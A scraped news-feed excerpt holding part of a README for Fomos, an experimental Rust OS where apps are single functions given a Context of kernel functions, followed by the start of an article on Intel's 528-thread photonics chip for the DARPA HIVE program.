<p dir="auto">The signature of an app in Fomos:</p>
<div dir="auto" data-snippet-clipboard-copy-content="pub extern &quot;C&quot; fn _start(ctx: &amp;mut Context) -> i32"><pre><span>pub</span> <span>extern</span> <span>"C"</span> <span>fn</span> <span>_start</span><span>(</span><span>ctx</span><span>:</span> <span>&amp;</span><span>mut</span> <span>Context</span><span>)</span> -&gt; <span>i32</span><span></span></pre></div>
<p dir="auto">Apps do not need a standard library, any OS functionality is given to the app through the <em>Context</em>.</p>
<p dir="auto">the <em>Context</em> is mostly a pointer to a bag of kernel functionnalities</p>

<p dir="auto">In Fomos, an app is really just a <strong>function</strong>. There is nothing else ! This is a <strong>huge</strong> claim. An executable for a Unix or Windows OS is extremely complex compared to a freestanding function.</p>
<p dir="auto"><code>&lt;rant&gt;</code></p>
<p dir="auto">It is out a frustration for all my Glibc problems during day job dev on linux that I chose to try this approach.</p>
<p dir="auto">I want a flat contract between an app and the OS. So what if an app was a function ? The contract is then <strong>only</strong> the explicit argument type.</p>
<p dir="auto">In Unix, an app has to know the target OS, but also what standard library it uses, that is 2 levels of indirections. Sometimes the os level has a conflict, sometimes the standard library level has a conflict, and sometimes I just don't have the level to understand why something doesn't work. I merely know it is related.</p>
<p dir="auto"><code>&lt;/rant&gt;</code></p>
<p dir="auto">I am trying to know if it is possible to have an OS-App ecosystem that does not suppose <strong>ANY</strong> <strong>implicit</strong> configuration. An app would <strong>JUST</strong> have to handle its explicit <code>start</code> <em>context</em> argument.</p>
<p dir="auto"><em>Context</em> gives any OS function necessary, think alloc, free, access to a framebuffer, or any hardware, any system calls etc.</p>
<p dir="auto">That way, apps could be freestanding, and compatible on multiple OS.</p>
<h3 tabindex="-1" dir="auto">More about Context</h3>
<p dir="auto">Here is the <em>Context</em> for the last version of this OS</p>
<div dir="auto" data-snippet-clipboard-copy-content="#[repr(C)]
pub struct Context<'a, T> {
    pub version: u8,
    pub start_time: u64,
    pub log: extern &quot;C&quot; fn(s: *const u8, l: u32),
    pub pid: u64,
    pub fb: FB<'a>,
    pub calloc: extern &quot;C&quot; fn(usize, usize) -> *mut u8,
    pub cdalloc: extern &quot;C&quot; fn(*mut u8, usize, usize),
    pub store: &amp;'a mut Option<Box<T>>,
    pub input: &amp;'a Input,
}"><pre><span>#<span>[</span>repr<span>(</span><span>C</span><span>)</span><span>]</span></span>
<span>pub</span> <span>struct</span> <span>Context</span><span>&lt;</span><span>'</span><span>a</span><span>,</span> <span>T</span><span>&gt;</span> <span>{</span>
    <span>pub</span> <span>version</span><span>:</span> <span>u8</span><span>,</span>
    <span>pub</span> <span>start_time</span><span>:</span> <span>u64</span><span>,</span>
    <span>pub</span> <span>log</span><span>:</span> <span>extern</span> <span>"C"</span> <span>fn</span><span>(</span><span>s</span><span>:</span> <span>*</span><span>const</span> <span>u8</span><span>,</span> <span>l</span><span>:</span> <span>u32</span><span>)</span><span>,</span>
    <span>pub</span> <span>pid</span><span>:</span> <span>u64</span><span>,</span>
    <span>pub</span> <span>fb</span><span>:</span> <span>FB</span><span>&lt;</span><span>'</span><span>a</span><span>&gt;</span><span>,</span>
    <span>pub</span> <span>calloc</span><span>:</span> <span>extern</span> <span>"C"</span> <span>fn</span><span>(</span><span>usize</span><span>,</span> <span>usize</span><span>)</span> -&gt; <span>*</span><span>mut</span> <span>u8</span><span>,</span>
    <span>pub</span> <span>cdalloc</span><span>:</span> <span>extern</span> <span>"C"</span> <span>fn</span><span>(</span><span>*</span><span>mut</span> <span>u8</span><span>,</span> <span>usize</span><span>,</span> <span>usize</span><span>)</span><span>,</span>
    <span>pub</span> <span>store</span><span>:</span> <span>&amp;</span><span>'</span><span>a</span> <span>mut</span> <span>Option</span><span>&lt;</span><span>Box</span><span>&lt;</span><span>T</span><span>&gt;</span><span>&gt;</span><span>,</span>
    <span>pub</span> <span>input</span><span>:</span> <span>&amp;</span><span>'</span><span>a</span> <span>Input</span><span>,</span>
<span>}</span></pre></div>
<p dir="auto">Note that <code>app_test</code> for instance, uses an old version of the <em>Context</em>, and still works on the newer version of the OS</p>
<p dir="auto">Old Context used by <code>app_test</code>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="#[repr(C)]
pub struct Context<'a> {
    pub version: u8,
    start_time: u64,
    log: extern &quot;C&quot; fn(s: *const u8, l: u32),
    pid: u64,
    fb: FB<'a>,
}"><pre><span>#<span>[</span>repr<span>(</span><span>C</span><span>)</span><span>]</span></span>
<span>pub</span> <span>struct</span> <span>Context</span><span>&lt;</span><span>'</span><span>a</span><span>&gt;</span> <span>{</span>
    <span>pub</span> <span>version</span><span>:</span> <span>u8</span><span>,</span>
    <span>start_time</span><span>:</span> <span>u64</span><span>,</span>
    <span>log</span><span>:</span> <span>extern</span> <span>"C"</span> <span>fn</span><span>(</span><span>s</span><span>:</span> <span>*</span><span>const</span> <span>u8</span><span>,</span> <span>l</span><span>:</span> <span>u32</span><span>)</span><span>,</span>
    <span>pid</span><span>:</span> <span>u64</span><span>,</span>
    <span>fb</span><span>:</span> <span>FB</span><span>&lt;</span><span>'</span><span>a</span><span>&gt;</span><span>,</span>
<span>}</span></pre></div>
<p dir="auto">Meaning Fomos already handles gracefully Apps designed for a much older version of itself. As long as the OS stays compatible with the old stuff in the context, it can add new functionalities for other App by just appending to the context the new functions (here calloc, cdalloc, store, and input).</p>
<p dir="auto"><code>app_test</code> precedes the dynamic allocation age !</p>
<p dir="auto">Could that pattern work in the long term ?</p>
<h3 tabindex="-1" dir="auto">How about system calls</h3>
<p dir="auto">None. Lets try to put everything into <em>Context</em> functions. No voodoo cpu instruction magic.</p>
<blockquote>
<p dir="auto">But how do you give back control to the OS ?</p>
</blockquote>
<p dir="auto">Just</p>

<blockquote>
<p dir="auto">How do you sleep, or wait asynchronously ?</p>
</blockquote>
<p dir="auto">Just</p>

<p dir="auto">Apps are <strong>cooperative</strong> in Fomos, They can just return (which would exit permanently an app on a classic OS), and assume that they are gonna be called through their only function <code>start</code> again soon, maybe even instantly if the "system call" works that way.</p>
<blockquote>
<p dir="auto">But an app loses all RAM data everytime it yields that way !</p>
</blockquote>
<p dir="auto">No, an app can store anything it wants in Context.store during its execution, and get it back every <code>start</code> call. The OS keeps everything in RAM (on the heap). The stack itself is "reset". But it is not more "reset" than it is after any function execution in a normal program. You don't lose anything. In Fomos, apps are merely a single function called multiple times!</p>
<p dir="auto">Over simplification of the kernel loop:</p>
<div dir="auto" data-snippet-clipboard-copy-content="loop {
    for app in apps.iter_mut() {
        app._start(Context::new(...));
    }
}"><pre><span>loop</span> <span>{</span>
    <span>for</span> app <span>in</span> apps<span>.</span><span>iter_mut</span><span>(</span><span>)</span> <span>{</span>
        app<span>.</span><span>_start</span><span>(</span><span>Context</span><span>::</span><span>new</span><span>(</span>..<span>.</span><span></span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span></pre></div>
<p dir="auto">There are a lot of questions without answer yet, but by now you might be curious, what if all the question had an answer in the pattern ? It looks like it could actually work (with a lot of work).</p>
<h2 tabindex="-1" dir="auto">Advantages</h2>
<p dir="auto">A lot of stuff comes free once you accept the premises.</p>
<h4 tabindex="-1" dir="auto">Sandboxing, instrumentation, debugging</h4>
<p dir="auto">Every functionnality and side effect given to an app goes explicitely through the <em>Context</em>. The <em>Context</em> is just a struct, we can wrap or replace anything in it.
Lets instrument an app we'll call <code>special_app</code>. Over simplification :</p>
<div dir="auto" data-snippet-clipboard-copy-content="loop {
    for normal_app in normal_apps.iter_mut() {
        app._start(Context::new(alloc,..));
    }
    // special_app alloc instrumentation
    fn alloc_log(..){log(&quot;allocation detected!&quot;); return alloc(..);}
    special_app._start(Context::new(alloc_log,..));
}"><pre><span>loop</span> <span>{</span>
    <span>for</span> normal_app <span>in</span> normal_apps<span>.</span><span>iter_mut</span><span>(</span><span>)</span> <span>{</span>
        app<span>.</span><span>_start</span><span>(</span><span>Context</span><span>::</span><span>new</span><span>(</span>alloc<span>,</span>..<span>)</span><span>)</span><span>;</span>
    <span>}</span>
    <span>// special_app alloc instrumentation</span>
    <span>fn</span> <span>alloc_log</span><span>(</span>..<span>)</span><span>{</span><span>log</span><span>(</span><span>"allocation detected!"</span><span>)</span><span>;</span> <span>return</span> <span>alloc</span><span>(</span>..<span>)</span><span>;</span><span>}</span>
    special_app<span>.</span><span>_start</span><span>(</span><span>Context</span><span>::</span><span>new</span><span>(</span>alloc_log<span>,</span>..<span>)</span><span>)</span><span>;</span>
<span>}</span></pre></div>
<h4 tabindex="-1" dir="auto">Restart, sleep, change of hardware</h4>
<p dir="auto">An app memory lives in its context. The stack is fleeting. It is reset after each yield and doesn't mean much in Fomos.
Since the <em>Context</em> is explicit, it can be stored. A restart <em>can</em> be made completely transparent to an app.</p>
<p dir="auto">Pseudo code:</p>
<div dir="auto" data-snippet-clipboard-copy-content="//kernel just started
...
let app = App::new(..);
let ctx = disk.load(app.id).unwrap_or(Context::new(..));
loop{
    app._start(ctx);
    if restart_request{
        disk.save(app.id, ctx)
        break;
    }
}
//handle restart
..."><pre><span>//kernel just started</span>
..<span>.</span>
<span>let</span> app = <span>App</span><span>::</span><span>new</span><span>(</span>..<span>)</span><span>;</span>
<span>let</span> ctx = disk<span>.</span><span>load</span><span>(</span>app<span>.</span><span>id</span><span>)</span><span>.</span><span>unwrap_or</span><span>(</span><span>Context</span><span>::</span><span>new</span><span>(</span>..<span>)</span><span>)</span><span>;</span>
<span>loop</span><span>{</span>
    app<span>.</span><span>_start</span><span>(</span>ctx<span>)</span><span>;</span>
    <span>if</span> restart_request<span>{</span>
        disk<span>.</span><span>save</span><span>(</span>app<span>.</span><span>id</span><span>,</span> ctx<span>)</span>
        break<span>;</span>
    <span>}</span>
<span>}</span>
<span>//handle restart</span>
...</pre></div>
<p dir="auto">Quickload and quicksave of an app complete state is trivial.
Note that some change of hardware could make an app bug. It would be a problem if it was transparent. However, it could be made opaque and obvious, in an opt-in manner, again through the <em>Context</em>.</p>
<h2 tabindex="-1" dir="auto">Disadvantages</h2>
<h3 tabindex="-1" dir="auto">Security</h3>
<p dir="auto">Right now it is not implemented, any app can casually check the ram of another app ^^. This is going to be a hard problem to solve. I have plans to have data security without context switch, and without giving every damn app its own virtual memory stack.</p>
<h3 tabindex="-1" dir="auto">Cooperative vs preemptive scheduling</h3>
<p dir="auto">The argument that a cooperative scheduling is doomed to fail is overblown. Apps are already very much cooperative.
For proof, run a version of that on your nice preemptive system :</p>
<div dir="auto" data-snippet-clipboard-copy-content="while(true){
  new Thread( () => {
    fs.writeFile(&quot;/home/&quot;+randomString(),randomString())
    malloc(randomInt())
    curl(&quot;http://&quot;+randomString()+&quot;.com&quot;)
  }  
}"><pre><span>while</span><span>(</span><span>true</span><span>)</span><span>{</span>
  <span>new</span> <span>Thread</span><span>(</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>fs</span><span>.</span><span>writeFile</span><span>(</span><span>"/home/"</span><span>+</span><span>randomString</span><span>(</span><span>)</span><span>,</span><span>randomString</span><span>(</span><span>)</span><span>)</span>
    <span>malloc</span><span>(</span><span>randomInt</span><span>(</span><span>)</span><span>)</span>
    <span>curl</span><span>(</span><span>"http://"</span><span>+</span><span>randomString</span><span>(</span><span>)</span><span>+</span><span>".com"</span><span>)</span>
  <span>}</span>  
<span>}</span></pre></div>
<ul dir="auto">
<li>Blender does a compelling impression of that when you increase the level of details one too many times. Might fill your swap and crash unsaved work on other apps.</li>
<li>Badly written Webgl websites crash my gpu driver.</li>
</ul>
<p dir="auto">Not only is preemptive scheduling not enough, IMO it is not necessary. Also it is a spectrum. A system can be optimistically cooperative, and turn preemptive pessimistically.</p>
<p dir="auto">However the ecosystem is made for preemptive OS. There is friction in doing things differently.</p>
<h2 tabindex="-1" dir="auto">Missing</h2>
<ul dir="auto">
<li>Permanent storage (should be easy since virtio is already implemented)</li>
<li>Gpu support (virgl wip)</li>
<li>Networking</li>
<li>A nice abstraction for apps to share data and functionnalities between themselves</li>
</ul>
<p dir="auto">The rest should live in userland.</p>
<h2 tabindex="-1" dir="auto">Building</h2>
<p dir="auto">On a linux, run</p>

<p dir="auto"><em>You might need rust nightly, gcc, qemu with virgl &amp; sdl flag</em></p>
<h2 tabindex="-1" dir="auto">Credit</h2>
<p dir="auto">Heavily inspired by <a href="https://os.phil-opp.com/" rel="nofollow">Philipp Oppermann's blog</a>.</p>
<p dir="auto">Thanks to <a href="https://github.com/darbysauter/myOS">darbysauter</a> for the advice given.</p>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Intel shows 8 core 528 thread processor with silicon photonics (398 pts)]]></title>
            <link>https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/</link>
            <guid>37315802</guid>
            <pubDate>Tue, 29 Aug 2023 23:56:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/">https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/</a>, See on <a href="https://news.ycombinator.com/item?id=37315802">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-8-Core-528-Thread-Chip-with-Optical-Networking-for-DARPA.jpg" data-caption="Intel 8 Core 528 Thread Chip With Optical Networking For DARPA"><img width="696" height="578" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-8-Core-528-Thread-Chip-with-Optical-Networking-for-DARPA-696x578.jpg" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-8-Core-528-Thread-Chip-with-Optical-Networking-for-DARPA-696x578.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-8-Core-528-Thread-Chip-with-Optical-Networking-for-DARPA-362x300.jpg 362w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-8-Core-528-Thread-Chip-with-Optical-Networking-for-DARPA-800x664.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-8-Core-528-Thread-Chip-with-Optical-Networking-for-DARPA-506x420.jpg 506w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-8-Core-528-Thread-Chip-with-Optical-Networking-for-DARPA.jpg 1034w" sizes="(max-width: 696px) 100vw, 696px" alt="Intel 8 Core 528 Thread Chip With Optical Networking For DARPA" title="Intel 8 Core 528 Thread Chip With Optical Networking For DARPA"></a><figcaption>Intel 8 Core 528 Thread Chip With Optical Networking For DARPA</figcaption></figure></div>
            <!-- content --><p>Intel had a cool technology on display at Hot Chips 2023, beyond just server chips. It had a direct mesh-to-mesh optical fabric. What might also be interesting is the 8-core processor with 66 threads per core.</p>
<p>Again, please excuse typos, these are being done live.<span id="more-72371"></span></p>
<h2>Intel Shows the First Direct Mesh-to-Mesh Optical Fabric</h2>
<p>The key motivation behind this was the DARPA HIVE program for hyper-sparse data.</p>
<figure id="attachment_72372" aria-describedby="caption-attachment-72372"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_03/" rel="attachment wp-att-72372"><img src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03-800x476.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_03" width="696" height="414" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03-800x476.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03-400x238.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03-1536x914.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03-696x414.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03-1068x635.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03-706x420.jpg 706w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_03.jpg 1627w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72372">Intel Direct Mesh To Mesh Optical Fabric_Page_03</figcaption></figure>
<p>When Intel profiled the workloads that DARPA was looking at, they found they were massively parallel. Still, they had poor cache line utilization and things like big long out-of-order pipelines were not well utilized.</p>
<figure id="attachment_72373" aria-describedby="caption-attachment-72373"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_04/" rel="attachment wp-att-72373"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_04" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04-696x392.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04-747x420.jpg 747w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_04.jpg 2000w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72373">Intel Direct Mesh To Mesh Optical Fabric_Page_04</figcaption></figure>
<p>Here is an interesting one. Intel has a 66-thread-per-core processor with 8 cores in a socket (528 threads?) The cache apparently is not well used due to the workload. This is a RISC ISA not x86.</p>
<figure id="attachment_72374" aria-describedby="caption-attachment-72374"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_05/" rel="attachment wp-att-72374"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_05" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-2048x1152.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-696x391.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_05-747x420.jpg 747w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72374">Intel Direct Mesh To Mesh Optical Fabric_Page_05</figcaption></figure>
<p>Intel is packing these into 16 sockets in a single OCP compute thread and using optical networking.</p>
<p>Here is the die architecture. Each core has multi-threaded pipelines.</p>
<figure id="attachment_72375" aria-describedby="caption-attachment-72375"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_06/" rel="attachment wp-att-72375"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_06" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-2048x1152.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-696x391.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_06-747x420.jpg 747w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72375">Intel Direct Mesh To Mesh Optical Fabric_Page_06</figcaption></figure>
<p>The high-speed I/O chips bridge the electrical to optical capabilities of the chip.</p>
<p>Here is the 10-port cut-through router being used.</p>
<figure id="attachment_72376" aria-describedby="caption-attachment-72376"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_07/" rel="attachment wp-att-72376"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_07" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07-696x392.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07-747x420.jpg 747w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_07.jpg 2000w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72376">Intel Direct Mesh To Mesh Optical Fabric_Page_07</figcaption></figure>
<p>Here is the on-die network where the routers are placed. Half of the 16 routers are there just to provide more bandwidth to the high-speed I/O. On-packaged EMIBs are being used for the physical connection layer.</p>
<figure id="attachment_72377" aria-describedby="caption-attachment-72377"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_08/" rel="attachment wp-att-72377"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_08" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-2048x1152.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-696x391.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-747x420.jpg 747w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72377">Intel Direct Mesh To Mesh Optical Fabric_Page_08</figcaption></figure>
<p>Going off-die, each chip uses silicon photonics to drive its optical networking. With this, the connections between cores can happen directly between chips even if they are not in the same chassis without adding switches and NICs.</p>
<figure id="attachment_72378" aria-describedby="caption-attachment-72378"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_09/" rel="attachment wp-att-72378"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-800x488.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_09" width="696" height="425" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-800x488.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-400x244.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-1536x936.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-2048x1248.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-696x424.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-1068x651.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-689x420.jpg 689w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72378">Intel Direct Mesh To Mesh Optical Fabric_Page_09</figcaption></figure>
<p>These chips are being packaged as a multi-chip package with EMIB. Having silicon photonics engines added a few other challenges of going from package to strands of fiber.</p>
<figure id="attachment_72379" aria-describedby="caption-attachment-72379"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_10/" rel="attachment wp-att-72379"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_10" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-2048x1152.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-696x392.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-746x420.jpg 746w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72379">Intel Direct Mesh To Mesh Optical Fabric_Page_10</figcaption></figure>
<p>Here is the optical performance.</p>
<figure id="attachment_72380" aria-describedby="caption-attachment-72380"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_11/" rel="attachment wp-att-72380"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_11" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-2048x1152.jpg 2048w, 